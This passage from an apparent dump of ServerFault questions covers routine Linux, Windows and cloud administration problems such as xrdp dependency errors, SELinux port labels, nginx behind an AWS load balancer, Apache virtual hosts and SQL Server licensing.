           Available: selinux-policy-3.13.1-229.el7_6.5.noarch (updates)
               selinux-policy = 3.13.1-229.el7_6.5
           Available: selinux-policy-3.13.1-229.el7_6.6.noarch (updates)
               selinux-policy = 3.13.1-229.el7_6.6
           Available: selinux-policy-3.13.1-229.el7_6.9.noarch (updates)
               selinux-policy = 3.13.1-229.el7_6.9
           Available: selinux-policy-3.13.1-229.el7_6.12.noarch (updates)
               selinux-policy = 3.13.1-229.el7_6.12
Error: Package: xorgxrdp-0.2.11-1.el7.x86_64 (epel)
           Requires: xorg-x11-server-Xorg(x86-64) = 1.20.4
           Installed: xorg-x11-server-Xorg-1.20.1-5.6.el7_6.x86_64 (@updates)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-5.6.el7_6
           Available: xorg-x11-server-Xorg-1.20.1-3.el7.x86_64 (base)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-3.el7
           Available: xorg-x11-server-Xorg-1.20.1-5.el7.x86_64 (updates)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-5.el7
           Available: xorg-x11-server-Xorg-1.20.1-5.1.el7.x86_64 (updates)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-5.1.el7
           Available: xorg-x11-server-Xorg-1.20.1-5.2.el7_6.x86_64 (updates)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-5.2.el7_6
           Available: xorg-x11-server-Xorg-1.20.1-5.3.el7_6.x86_64 (updates)
               xorg-x11-server-Xorg(x86-64) = 1.20.1-5.3.el7_6
 You could try using --skip-broken to work around the problem
 You could try running: rpm -Va --nofiles --nodigest</code></p>

<p>So I research that and someone said I could resolve these dependencies by installing the following:</p>

<p><code>rpm -Uvh http://scientificlinux.mirror.ac.za/7.6/x86_64/updates/security/selinux-policy-3.13.1-252.el7.1.noarch.rpm</code></p>

<p>But when I do that I get another dependency error that looks like this:</p>

<p><code>error: Failed dependencies:
        selinux-policy = 3.13.1-229.el7_6.15 is needed by (installed) selinux-policy-targeted-3.13.1-229.el7_6.15.noarch</code></p>

<p>But that seems really odd because isn't the version of selinux-policy that error is saying I need the version I have installed according to my xrdp error?</p>

<p>Anyway, that was the brick wall on my journey.  I'm not sure what to do next.  And if I can't get xrdp installed is there another way to access the GNOME desktop of my machine?  I am a novice at both Linux and Azure and I didn't see a console option besides the serial console on the Azure portal.</p>

<p>Thanks.</p>
","<centos7><xrdp>","2019-09-14 23:17:26"
"768158","Turn on Security Essentials on Windows Server 2008 R2","<p>Is it possible to turn on microsoft security essentials on windows server 2008 r2? clicking on the application icon shows a message that it has been turned off and to see security and maintenance to enable. however there are no options in security and maintenance for security essentials.</p>
","<ms-security-essentials>","2016-04-04 23:21:40"
"938539","A better tool for console-to-console communication on Linux?","<p>On occasion administrators working on a given system will ""collide"" with one another when one administrator's actions impact the other.  Part of my solution is to add 'who' to root's .profile so that, when an administrator sudo's to root, they will know if other administrator's are currently on the system.  I would like to alert all administrators to the ""entrance"" of an additional administrator as well.  I tried wall, write or <code>echo ""Blah"" &gt; /dev/pts1</code> (whatever).  The problem I have (unless I missed an option in the man page) with these approaches is that, when the message appears, it ""takes focus"" and can leave you wondering what the state of your session is.  I've learned that you can continue typing and haven't been disrupted but it's still bothersome.  We also have some administrators who wouldn't know what to do if that happened to them.  I'm also trying to avoid chat applications because I want people to be able to continue working.</p>

<p>Are there better options or something I've missed which will alleviate this issue?  What would be ideal would be a popup in a separate context.</p>
","<linux><console>","2018-11-04 02:24:11"
"984380","using random ports with iperf/iperf3","<p>I am using  Iperf/iperf3 -c remotehost which is </p>

<blockquote>
  <p>iPerf3 is a tool for active measurements of the maximum achievable bandwidth on IP networks. It supports tuning of various parameters related to timing, buffers and protocols (TCP, UDP, SCTP with IPv4 and IPv6).</p>
</blockquote>

<p>My  question is how to use random port with a specific range (5300-5400) while using <code>Iperf/iperf3 -c remotehost</code></p>
","<iperf>","2019-09-16 11:18:49"
"984491","Why ldap user on ldap client must have root ldap password in his config?","<p>My Ldap  conf has permiss for client  user Acl to see ,modif auth his attr so why I need to have on clienta PC root pass or other specjal account to bind like binddn ,rootdn?Can somebody explain this proces?. </p>
","<openldap>","2019-09-17 05:16:47"
"858544","SQL Server 2016 Standard edition: licensing per core or per server/CAL","<p>We've 1500 users (no connection from internet/extranet). This number is stable and will be stable. These users will use around 150 different databases each of them have not a really intensive workload and not really large (between 1Go and 100Go, total of 5 To). We want to use SQL Server 2016.</p>

<p>According to my calculations, I've the following possibilities:</p>

<p>Standard edition per server/CAL: </p>

<ul>
<li>1500 CAL = 270k$</li>
<li>10 servers = 10k$ (each with max. 24 cores = 240 cores)</li>
<li>Total = 280k$</li>
</ul>

<p>For the same amount, if I use the Standard edition per Core licensing model</p>

<ul>
<li>280k$ / 3.8k$ (price per 2-cores) = 150 cores (around 6 servers)</li>
</ul>

<p>and if I want to add an additional server, the first option will cost me only 1k$ and the second 40k$ (for 24-cores).</p>

<p>According to many info on the net, the per server/cal licensing is designed for company with a really low number of users (less than 30). But my calculations show that in my case I  should go for this type of license (and I've many more users).</p>

<p>I'm lost and I think there is mistake somewhere but can't spot it. </p>

<ul>
<li>I misinterpreted the licences or missed something in the licensing model </li>
<li>I've too many servers for this potential workload and should go for less cores. 100 cores is probably more than needed to handle 1500 users and 5To according to your experience.</li>
<li>Anything else?</li>
</ul>

<p>Thx for sharing your expertise on this.</p>
","<sql-server>","2017-06-29 11:27:01"
"768422","Manually sent ICMP redirect packets","<p>I'm trying to sent a ICMP redirect to my router to add a new route, as I can not configure it from the portal, and have no access to it though telnet/ssh.</p>

<p>The scenario is the next.
LAN network
192.168.1.0/24
New network
102.168.2.0/24</p>

<p>If I setup all the devices though DHCP or by hand I can access all the devices, but I prefer to add the route to the router to handle it.</p>

<p>I tried to found some info on the ping man and internet, with no luck</p>

<p>Can someone help me?</p>

<p>Thanks in advance</p>
","<linux><mac-osx><redirect><tcp><icmp>","2016-04-05 23:54:38"
"768434","upgrade DC from 2008 to 2012 with exchange 2007 r2","<p>currently we have server 2008 domain controller environment with exchange 2007 r2 &amp; office communications server 2007 r2. we are planning to upgrade domain controller to 2012 r2 (both domain and functional level to 2012 r2). question is i want to make sure that exchange 2007 will still work after upgrade. i can retire office communications and use skype for business instead,. will it still work? what do i need to consider before doing this? thanks in advance. </p>
","<windows-server-2012-r2><exchange-2007><ms-office-communicator>","2016-04-06 01:04:26"
"938799","Monitor and act on another process CPU consumption","<p>I'm looking for away to monitor a specific process CPU consumption and act if the process didn't consume any CPU for the last X minutes/seconds on linux. </p>

<p>The use case it that I've a machine on EC2 (obtained using spot request) that I would like to power down if a given process on  doesn't really do any work (not crashed, just sitting in ideal) I would like to accomplish it from within the  machine without any of AWS services.</p>

<p>Thanks,
Eden</p>
","<linux><monitoring><process>","2018-11-06 07:29:28"
"984582","How to install php 5 on Debian 10?","<p>I need advice how to install php5 on this os. There is only php7 package available, but for my system php5 is required.</p>
","<debian><php5>","2019-09-17 17:04:21"
"858654","AWS - elb - nginx connection refused","<p>I'm having the issue with ELB constantly showing unhealthy instance. The <code>access.log</code> and <code>error.log</code> are both empty, which makes it seem the ELB is not able to reach the EC2 instance at all. For the sake of testing, I'm using security groups that allow <code>All Traffic</code> to make sure it's not it's not security groups problem on both the ELB and EC2 instance.</p>

<p>Below is the nginx.conf file I'm using with .ebextensions, it's being created properly as I see it in the <code>/etc/nginx/conf.d/00_elastic_beanstalk_proxy.conf</code>. The ELB test is on <code>HTTP Port 80 /elb-health-check</code></p>

<pre><code>container_commands:
  00-copy-my-nginx-config:
    command: ""sudo cp /tmp/my-custom-nginx.conf 
/tmp/deployment/config/#etc#nginx#conf.d#00_elastic_beanstalk_proxy.conf""

  01-delete-my-nginx-config:
    command: ""sudo rm /tmp/my-custom-nginx.conf""

files:
  ""/tmp/my-custom-nginx.conf"":
   mode: ""000644""
   owner: root
   group: root
   content: |
  server
  {
      listen 80 default_server;
      listen [::]:80 default_server ipv6only=on;

      # Don't redirect the health check for ELB
      location /elb-health-check
      {
          access_log off;
          return 200;
      }
  }

  server
  {
      listen 80;
      server_name example.com;
      root /var/app/current/public;

      # Redirect to HTTPs
      if ($http_x_forwarded_proto = ""http"")
      {
          return 301 https://$host$request_uri;
      }

      # API requests to server
      location /
      {
          proxy_pass http://localhost:3000/;
      }
  }
</code></pre>

<p>I tried connecting to the server directly on port 80, it gives me a <code>Connection Refused</code> error, but when I connect on port 3000, it works fine, so I'm suspecting the issue would be with nginx not allowing any requests to come in.</p>

<p>The listeners on the ELB are HTTP 80 -> HTTP 80, HTTPs 443 -> HTTP 80, the SSL is being handled on the ELB using Amazon certificate.</p>

<p>Any suggestions would be highly appreciated, thanks.</p>
","<nginx><amazon-web-services><amazon-elb>","2017-06-29 22:20:59"
"768716","In terms of stability, who beats whom? VPS or dedicated server?","<p>basically I am asking because I am wondering if dedicated servers are really more stable than VPS?</p>

<p>I read here:</p>

<p><a href=""http://www.inmotionhosting.com/support/website/difference-between-shared-vps-dedicated-hosting"" rel=""nofollow noreferrer"">http://www.inmotionhosting.com/support/website/difference-between-shared-vps-dedicated-hosting</a></p>

<blockquote>
  <p>A VPS Server is not a Dedicated Server, so you are still on a server with other users. As you're sharing a server, your actions can still affect other users. If you have a very busy website, dominating the server's CPU time and memory could cause performance issues with other users on the same server. If you are running an unoptimized script that runs out of control, it can disrupt not only your site, but could affect the whole server. This can and possibly cause downtime for others users on the same server.</p>
</blockquote>

<p>is this actually a concern? </p>

<p>a good thing about VPS is that you can upgrade their hardware whenever you feel like. Furthermore, i somehow have the feeling that it is easier to backup/restore the server, as it is right, basically a VM running somewhere. So if say, the dedicated server goes up in flames, you'd need pretty much the exact same physical machine, whereas a VM just can run somewhere.</p>

<p>bottom line question:</p>

<p>Is vps less stable than a dedicated server?</p>

<p>the reason i am asking:
a friend had a server downtime of 7 hours on his shared host (bluehosts). He lost a client because of that worth 3000 dollars. Now he is upset of course, and wants something more stable. AWS beanstalk for the php part and AWS RDS for the mysql DB came to my mind... but it feels like an overkill. I think a stable VPS host should do just fine. But the trick question still remains... if we choose something simpler, maybe a dedicated server is still more stable? </p>
","<backup><vps><dedicated-server><restore><uptime>","2016-04-07 07:54:30"
"768759","Python and java static IP","<p>I have a Python server. Each time I change the network the IP changes. I want it to have a static IP over all networks so it can receive data without customizing the code every time. I want to do the same for a Java server too.</p>
","<ip><java><python><socket><static-ip>","2016-04-07 10:27:05"
"984704","Find the overall disk size of a linux server","<p>i have a requirement to check the overall disk size of a linux server.
is there any shell script to find the overall disk size.</p>

<p>example:</p>

<p>serverA -- allocated with 5 disks of below size</p>

<p>sda - 100G
sdb - 200G
sdc - 200G
sdd - 500G
sde - 1TB</p>

<p>overall disk size of the linux server is 2TB.
run  a shell script to get the overall size = 2TB</p>

<p>can someone help on this.</p>

<p>Regards
SUBASH</p>
","<linux><redhat><shell-scripting>","2019-09-18 14:32:07"
"984777","What is the best way to transfer 4tb image from windows to centos?","<p>My windows server has 4tb image files, images are scattered in folders by year(10 years), i want to transfer these images to centos. Is there a tool that can upload multiple(not one by one in queue), and retry upload when fail?</p>
","<upload>","2019-09-19 02:21:14"
"858977","How to make custom router login page?","<p>I am trying to make a custom router login page. I want the user to ridirected to the login page when he/she connects to the wifi network. How can i make such a login /registration system?</p>
","<php><html><login-script>","2017-07-02 16:01:39"
"984797","SSH service stopped in Google Cloud mistakenly","<p>SSH service got stopped in google cloud mistakenly now unable to connect to the google cloud instance.</p>

<p>Is there any possible way to restart SSH service as I am not able to login into the instance via. google cloud default ssh browser.</p>

<p>Kindly help as its urgent need to make some change on instances immediately</p>

<p>Thank you</p>
","<ssh><google-compute-engine><cloud>","2019-09-19 06:48:50"
"769078","Should I scale vertically or horizontally assuming equal pricing?","<p>AWS instances usually have a linear pricing model:</p>

<p>i.e. 2 small instances are the same price as one medium instance (which has exactly 2x the performance specs).</p>

<p>So what would be the better choice? Double the machine performance, or double the machines. Please disregard the advantage of redundancy gained from using two small machines.</p>
","<amazon-web-services><scaling>","2016-04-08 15:44:08"
"938966","All log files seemingly deleted","<p>I wanted to change to the log directory on ubuntu server, and check duplicity log, but I don't know what happened, it seems that all log files and sub-directories have gone missing! This is the command I used when I logged into the server:</p>

<pre><code>sudo su | cd /var/log | cat duplicity.log | grep -i '. errors' | sort | uniq
</code></pre>

<p>I suppose I should have replaces first two pipes with <code>&amp;&amp;</code>. I have several questions, can I restore logs somehow? Will they continue to appear as they usually appear? Will deletion of all the log files create some server problems? Why did this happen?</p>
","<linux><ubuntu><logging><log-files><ubuntu-16.04>","2018-11-07 11:36:39"
"769123","Linux SSH Timeout","<p>I have been struggling with a couple system timing out after X minutes of inactivity and not sure how to fix it.</p>

<p>I have a CentOS box at my office. Connect to SSH can not touch it for 2 hours and its still live when i run something.</p>

<p>However connect to that same box at home, and it will sometimes timeout after a couple seconds sometimes after a couple minutes.</p>

<p>I would think it is my internet connection however if I am actively using the box it will stay connected.</p>

<p>However if i stop typing to google something it will show a disconnected message and i have to reconnect.</p>

<p>Anything i can check to see what is going on?</p>
","<centos>","2016-04-08 19:11:06"
"938993","Powershell subsequent usernames","<p>I just started learning Powershell and I was wondering how to make a powershell script that scans the OU for users and picks the subsequent number. For example when I have a ""User1"" and ""User2"" in my OU it will create ""User3"" when I run the script</p>
","<active-directory><powershell>","2018-11-07 14:52:02"
"769167","Two physical web servers on port 80 behind a router","<h3>Current scenario</h3>

<p>I have an Apache server running on default port 80 on a CentOS 6.7 box.  I forward port 80 from my router to this machine, and I can access it from the outside with my domain <code>a.com</code>.  Everything works as expected.</p>

<h3>What I want to do</h3>

<p>I stood up a second machine, CentOS 7, to act as a dedicated <a href=""https://about.gitlab.com/"" rel=""nofollow noreferrer"">GitLab</a> server.  By default, it runs the web interface through nginx on port 80.
I want to be able to access it through my subdomain <code>gitlab.a.com</code>.</p>

<hr>

<p>Is this possible to do?  And if so, am I on the right track thinking it can be done with some combination of using a virtual host and a reverse proxy in Apache?  I'd prefer both of them to run on 80 if possible and not use alternate ports.</p>
","<apache-2.2><routing><subdomain>","2016-04-09 07:28:11"
"769170","Can ip address and gateway be the same and can number of clients be increased by changing the subnet mask?","<p>So I am a newbie just learning networking and was wondering if gateway can be same as the allocated IP address. Also, if I have to increase the number of users that connect to my router (having default mask 255.255.255.0) can I do that by changing the default mask to something like 255.255.248.0 or any other? 
Please help me out. Thanks.</p>
","<networking><ip-address>","2016-04-09 07:37:42"
"859208","vsphere to install on ubuntu desktop","<p>we have some servers that Vmware workstation installed on them.
there is no problem controlling Vmware via Vsphere in windows.
but since we use Linux , we could not find a graphical UI to work on our servers Vmware.
is there any free application such as vsphere for ubuntu desktop .</p>

<p>comment : linux version installed on our pc is ubuntu 16.04 LTS desktop</p>
","<vmware-vsphere>","2017-07-04 04:51:32"
"769186","Why my Wordpress is trying to connect to an strange url?","<p>I'm managing a Wordpress site and in the lasts months an strange 502 Bad Gateway error has been appearing. I enabled the log and discovered that it tries to access to strange urls like:</p>

<ul>
<li>gd-join.com </li>
<li>www.toupiaovip.com </li>
<li>balkanskichat.com </li>
<li>gtaturk.com</li>
</ul>

<p>The log line is this:</p>

<blockquote>
  <p>stream_socket_client(): unable to connect to tcp://gtaturk.com:80
  (Connection timed out) in
  /usr/share/nginx/html/wp-includes/class-http.php on line 1008</p>
</blockquote>

<p>What could be the reason?</p>
","<nginx><wordpress>","2016-04-09 10:28:28"
"769216","I can't get my website to be enabled?","<p>I have two websites:</p>

<p>iq-dev.de and iq-dev.com</p>

<p>iq-dev.de works without a problem and is also available through www.iq-dev.de. I have a cloud Server with linux installed and edit everything via ssh. </p>

<p>My hostname is ""thor"" and I tried:</p>

<ul>
<li>Adding iq-dev.com to my hosts file</li>
<li>Adding iq-dev.com as ""sites-enabled"" / ""sites-available"" in the apache2 files</li>
</ul>

<p>My hosts looked like this:</p>

<pre><code>127.0.0.1       localhost localhost
82.223.17.182 iq-dev.com thor
82.223.17.182 iq-dev.de thor

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre>

<p>In my Sites Available and Sites Enabled I added the file <code>iq-dev.com.conf</code> with these settings:</p>

<pre><code>&lt;VirtualHost *:80&gt;
        # The ServerName directive sets the request scheme, hostname and port t$
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        ServerName iq-dev.com
        ServerAlias www.iq-dev.com
        DocumentRoot /var/www/iq-dev.de/main

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
#LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with ""a2disconf"".
#Include conf-available/serve-cgi-bin.conf
&lt;/VirtualHost&gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre>

<p>Can anyone tell me where I went wrong? I really don't get what to do now. I searched different tutorials for the hosts file and sites-available/sites-enabled but I can't see anything wrong. </p>

<p>What I want to do of course is just to have iq-dev.com resolve to the same folder as iq-dev.de.</p>
","<apache-2.4><hosts>","2016-04-09 15:43:26"
"859249","Windows 10, two monitors with two different sessions","<p>I want to do some thing but I can't find anything about it. I remember that on Linux you can do a <code>multisit workstation</code> with one PC and several screens and perifericals (mouse, keyboard, etc), configuring X11 to serve different user sessions on different screens <strong>with only one PC</strong>.</p>

<p>I want to do the same or something similar on Windows 10. I need to have one user session on one screen and other user session on the other screen.</p>

<p>That's possible with <strong>Windows 10 Creators Update</strong>?</p>

<p>Maybe hardware is relevant:</p>

<ul>
<li>Intel i7 6700HQ 3.4GHz / RAM 32 GB DDR4 2133 MHz</li>
<li>Intel HD Graphics 530</li>
<li>NVIDIA GeForce GTX 1060</li>
<li>2 minidisplay port, 2 HDMI port, USB-C</li>
</ul>

<p>Thank you.</p>
","<windows-10><multiple-instances><graphics-processing-unit>","2017-07-04 09:47:31"
"859424","HP ProLiant ML370 G6 shows no sign of life after RAM upgrade","<p>I have power issues with my HP ProLiant ML370 G6 server after Ram upgrade. This server has been running without interruption for a very long time and when we decided to power it off to upgrade RAM we couldn't power  it on again. It looks like th MB recives no power. In the trobleshooting process we replaced one of our redundant power supplies with a new one. Nothing changed. All leds on the MB are off. Power supply leds are off. Though power supply fans are spinning. I've already tried basic trobleshooting operations for this kind of problems (change power outlet and cable, disconnect any internal component like ram or hard drives). In the end we stopped even tring to power it on and we abbandoned the server with all its components diconnected in a storage room for 3 months. 
Now we decided to give it another chance and when we plugged it on again, mb leds and power button led were on and i could even power it on. Ofcourse we got boot errors for the components missing so I tried to power it back off by pressing for a few seconds the power button but it didn't work and i had to directly unplug it. Now we are back at the beginning because the server is dead again. 
Considering this do you think that the power backplane is the problem? maybe it's capacitors  decharged during this last 3 months and that's the reason why I could power it on for a few minutes?
I also have to tell you that the power button seems damaged. It looks like its always pressed in. Do you think that a damaged power button could cause the total interruption of power to the MB? I thought that when the power button is damaged maybe you cannot turn the server on but you can atleast see some leds on the MB on.
Any suggestions? Thanks</p>
","<electrical-power>","2017-07-05 08:51:27"
"769259","Does anyone know how Android detects the presence of internet access over wifi?","<p>I'm working on a ""spoof internet"" for an art installation, and I've run into a snag that you might be able to help me with. The goal is to create a wireless hotspot that looks like it has internet access, but resolves all domains to the address of my laptop. From there, I'm hosting satirical versions of popular websites. </p>

<p>The problem is that mobile devices (I've only tested on Android so far, but I assume iOS does this as well) can detect the lack of internet access on a wifi hotspot and will fall back to their cell radio. I was hoping that it was simply ""calling home"" and that I could fake a response, but I don't see any traffic of that sort when monitoring the network with wireshark.</p>

<p>Does anyone have any insight into how this is done?</p>
","<networking>","2016-04-10 00:14:00"
"859467","How to collect I/O Bandwidth statistics on ubuntu 14.","<p>I want to write script/service to collect I/O bandwidth consumption on daily basis. I know nload tool which will show total I/O data transfer from the time we executed the command. I want script to generate data for this bandwidth and save in some file on day to day or per hours basic. Please suggest if I can use any other tool. </p>

<p>Thanks in advance.</p>
","<ubuntu><shell-scripting><network-monitoring><bandwidth-measuring>","2017-07-05 11:57:38"
"939139","SELinux: How can I use the 8081 port with apache?","<p>I need to use the 8081 port with Apache but Selinux doesn't allow that:</p>

<pre><code>semanage port -l | grep http_port_t
http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000

semanage port -l | grep 8081
transproxy_port_t              tcp      8081
</code></pre>

<p>So, if the httpd.conf there is this:</p>

<pre><code>Listen 8081
</code></pre>

<p>then I can't start httpd because I get this error:</p>

<pre><code>#systemctl start httpd
Job for httpd.service failed because the control process exited with error code. 
See ""systemctl status httpd.service"" and ""journalctl -xe"" for details.



#systemctl status httpd.service
httpd.service - The Apache HTTP Server
   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)
   Active: failed (Result: exit-code) since lun 2018-11-05 19:21:31 CET; 36s ago
     Docs: man:httpd(8)
           man:apachectl(8)
  Process: 1953 ExecStop=/bin/kill -WINCH ${MAINPID} (code=exited, status=1/FAILURE)
  Process: 1952 ExecStart=/usr/sbin/httpd $OPTIONS -DFOREGROUND (code=exited, status=1/FAILURE)
 Main PID: 1952 (code=exited, status=1/FAILURE)

nov 05 19:21:31 localhost.localdomain httpd[1952]: (13)Permission denied: AH00072: make_sock: could not bind to address [::]:8081
nov 05 19:21:31 localhost.localdomain httpd[1952]: (13)Permission denied: AH00072: make_sock: could not bind to address 0.0.0.0:8081
nov 05 19:21:31 localhost.localdomain httpd[1952]: no listening sockets available, shutting down
nov 05 19:21:31 localhost.localdomain httpd[1952]: AH00015: Unable to open logs
nov 05 19:21:31 localhost.localdomain systemd[1]: httpd.service: main process exited, code=exited, status=1/FAILURE
nov 05 19:21:31 localhost.localdomain kill[1953]: kill: cannot find process """"
nov 05 19:21:31 localhost.localdomain systemd[1]: httpd.service: control process exited, code=exited status=1
nov 05 19:21:31 localhost.localdomain systemd[1]: Failed to start The Apache HTTP Server.
nov 05 19:21:31 localhost.localdomain systemd[1]: Unit httpd.service entered failed state.
nov 05 19:21:31 localhost.localdomain systemd[1]: httpd.service failed.
</code></pre>

<p>How can I do?</p>
","<linux><apache-2.2><networking><port-forwarding><selinux>","2018-11-08 12:51:19"
"769544","What changes with Kerberos Authentication in IPv6 when using NAT?","<p>How should Kerberos Authentication be setup with IPv6? </p>

<p>Of you're using NAT for IPv6 where there is a single public IPv6 address and it translates to the machines inside in the ULA range?</p>
","<ipv6><kerberos><mitkerberos>","2016-04-11 15:58:05"
"859750","RAID DP brain teaser","<p>Someone knows what happens if the parity disk fails simultaneously with a data disk?
It is supposed to handle double disk failure but since one parity disk fails it seems impossible. Does anybody have an answer?
Thanks</p>
","<raid><hard-drive><storage><netapp><drive-failure>","2017-07-06 16:02:13"
"939398","How do i check if an instance is in the terminating state?","<p>This returns InstanceStatuses:</p>

<pre><code>aws ec2 describe-instance-status --include-all-instances --instance-ids i-123123123
</code></pre>

<p>Which looks like:</p>

<pre><code>{
    ""InstanceStatuses"": [
        {
            ""AvailabilityZone"": ""us-west-2a"",
            ""InstanceId"": ""i-123123123"",
            ""InstanceState"": {
                ""Code"": 16,
                ""Name"": ""running""
            },
            ""InstanceStatus"": {
                ""Details"": [
                    {
                        ""Name"": ""reachability"",
                        ""Status"": ""passed""
                    }
                ],
                ""Status"": ""ok""
            },
            ""SystemStatus"": {
                ""Details"": [
                    {
                        ""Name"": ""reachability"",
                        ""Status"": ""passed""
                    }
                ],
                ""Status"": ""ok""
            }
        }
    ]
}
</code></pre>

<p>What does the state looks like when the instance is ""terminating""? Not already terminated but pending termination? How can I check if an instance is in the pending termination state?</p>
","<amazon-web-services><amazon-ec2><aws-cli>","2018-11-09 23:35:20"
"769717","Server got blank with error: -bash: fork: Cannot allocate memory","<p>My Vps is not executing any command. Server load is high and memeory usage is 100% due to which this error occured</p>

<p><strong>-bash: fork: Cannot allocate memory</strong>. </p>

<p>I just want to what is this process PHP and why user frie is getting so many requests to execute this. due to which i am getting short of memeory.
Kindly help me what to do in this situation. </p>

<p>Output of top</p>

<pre><code>top - 08:48:07 up  3:40,  2 users,  load average: 57.30, 35.14, 26.40
Tasks: 204 total,  64 running, 126 sleeping,   0 stopped,  14 zombie
Cpu(s): 83.7%us, 15.3%sy,  0.0%ni,  1.0%id,  0.0%wa,  0.0%hi,  0.0%si,0.0%st
Mem:   1572864k total,  1570704k used,     2160k free,        0k buffers
Swap:  2097152k total,   812544k used,  1284608k free,     6588k cached

PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
5056 frie      20   0  166m  32m 6028 R  2.0  2.1   0:00.55 php
5062 frie      20   0  164m  31m 5996 R  2.0  2.1   0:00.50 php
5077 frie      20   0  157m  31m 5880 R  2.0  2.0   0:00.38 php
5091 frie      20   0  151m  26m 5840 R  2.0  1.7   0:00.28 php
5105 frie      20   0  138m  19m 5608 R  2.0  1.2   0:00.12 php
4942 demoin    20   0  210m  15m 5564 R  1.7  1.0   0:00.80 php
5020 frie      20   0  174m  31m 6260 R  1.7  2.1   0:00.97 php
5022 frie      20   0  174m  44m 6132 R  1.7  2.9   0:01.01 php
5031 frie      20   0  175m  30m 6168 R  1.7  2.0   0:00.92 php
5041 frie      20   0  169m  33m 6208 R  1.7  2.2   0:00.72 php
5043 frie      20   0  168m  41m 6112 R  1.7  2.7   0:00.68 php
5044 frie      20   0  166m  41m 6204 R  1.7  2.7   0:00.69 php
5045 frie      20   0  168m  41m 6212 R  1.7  2.7   0:00.69 php
5046 frie      20   0  168m  40m 6144 R  1.7  2.6   0:00.67 php
5047 frie      20   0  168m  37m 6164 R  1.7  2.4   0:00.64 php
</code></pre>

<p>Screen-Shot</p>

<p><a href=""https://i.sstatic.net/XE8LJ.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/XE8LJ.jpg"" alt=""enter image description here""></a></p>
","<linux><php><load-balancing>","2016-04-12 09:03:18"
"939537","Shares not working on Server 2016 domain controller","<p>I dealing with a domain controller which was recently compromised. 
There is no valid backup to recover from.</p>

<p>I'm trying to join a new machine to the domain so that I can promote it and take over the FSMO roles So i can decom the compromised machine, however I cannot get the new machine to join the domain. The error its giving is 'The network path could not be found'. </p>

<p>I noticed that the shares on the DC cannot be accessed when using its local IP (192.168.3.251), either on the DC itself or some other machines on the network. </p>

<p>I can see the shares, however, if i browse to 127.0.0.1. </p>

<p>I have tried resetting the NIC with...  </p>

<ul>
<li>nbtstat -R </li>
<li>nbtstat -RR </li>
<li>netsh int reset all </li>
<li>netsh int ipv4 reset </li>
<li>netsh int ipv6 reset </li>
<li>netsh winsock reset</li>
</ul>

<p>But that hasnt made any difference. </p>

<p>Any suggestions on what I can do to get the shares working again?
Thanks in advance :)</p>
","<network-share><windows-server-2016><shares>","2018-11-11 12:01:04"
"769829","I think I'm Hacked. MySQL Server Too Many Connections Made my Server CPU load 100%","<p>I'm having a very urgent problem. Suddenly today My Server can't send email, after i checked out the log turns out there are many errors from MySQL which says too many connections. I checked out my webmin and it shows CPU Usage 100%. When I go to Database Connections menu on Webmin it shows so many connections, very short timed and I cannot killed it.</p>

<p>54  vmail   localhost:44792 vmail   Sleep   00:00:04<br>
55  vmail   localhost:44794 vmail   Sleep   00:00:04<br>
56  vmail   localhost:44796 vmail   Sleep   00:00:04<br>
57  vmail   localhost:44798 vmail   Sleep   00:00:04<br>
58  vmail   localhost:44800 vmail   Sleep   00:00:04<br>
59  vmail   localhost:44801 vmail   Sleep   00:00:04<br>
60  vmail   localhost:44804 vmail   Sleep   00:00:04    </p>

<p>Everytime I tried to kill the process it says ""unknown thread id""</p>

<p>Am I hacked? Please help me, I'm panicking right now. What should I do now? I am currently running the server online with my MySQL Server stopped because it's the only way to reduce the CPU usage.</p>

<p>I'm currently running on ubuntu 15. Pleas help</p>
","<ubuntu><mysql><hacking><webmin>","2016-04-12 15:12:24"
"860032","Connect by SSH to a certain device knowing public and private IP addresses?","<p>I want to connect to a computer which is always on at home from anywhere.</p>

<p>Suppose my router has the static public IP of <code>1.2.3.4</code> and a netmask of <code>255.255.255.0</code>.</p>

<p>As far as I'm concerned, every computer connected to it will have the same public IP address. But I want to connect to a specific device connected to it, suppose it has the private IP of <code>192.168.0.10</code> and the private IP of the access point is <code>192.168.0.0</code>.</p>

<p>A SSH server is already installed and the port 22 is opened on the computer. The router is also configured to be able to receive connections from the outside world.</p>

<p>Should I just do</p>

<pre><code>ssh -p 22 username@1.2.3.4
</code></pre>

<p>Doesn't this method send a ssh connection request to all connected computers to the router? What if two computers share an username? Can't I just connect to one <strong>specific</strong> device?</p>

<p>Sorry if this a stupid question, I'm starting to learn about computer networking.</p>
","<ssh><ip-address>","2017-07-08 10:47:44"
"769842","VMWare and storage virtualization solution","<p>I'd like to use the capabilities of two Dell EqualLogic SAN and a VMWare vSphere 6 installation to implement a storage virtualization solution.</p>

<p>Basically I'd like to put virtual SAN layer above my two physical SANs so that it can provide the same services as a usual SAN, this is for say, LUNs, iSCSI endpoint and more, NFS, CIFS shares, etc...</p>

<p>The idea is that whatever happens to the physical layer, I can replace the defective device in a transparent manner or attach new devices to the virtual layer so that more space is available.</p>

<p>On its end, the storage virtualization layer should make sure to replicate data for redundancy and use the capabilities of the physical devices for replication, snapshots and other.</p>

